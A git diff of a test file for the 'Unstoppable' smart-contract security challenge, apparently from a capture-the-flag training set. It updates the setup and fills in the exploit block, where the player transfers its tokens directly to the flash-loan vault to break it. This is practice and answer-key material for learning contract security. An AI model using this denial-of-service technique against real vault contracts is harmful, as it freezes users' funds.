@@ -41,9 +41,10 @@ describe('[Challenge] Unstoppable', function () {
         expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);
 
         // Show it's possible for someUser to take out a flash loan
-        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
-        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
-        await this.receiverContract.executeFlashLoan(10);
+        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
+            vault.address
+        );
+        await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
     /**
@@ -60,8 +61,8 @@ describe('[Challenge] Unstoppable', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
         
-        const attackTokenContract = this.token.connect(attacker);
-        await attackTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        const attackTokenContract = token.connect(player);
+        await attackTokenContract.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
     });
 
     after(async function () {
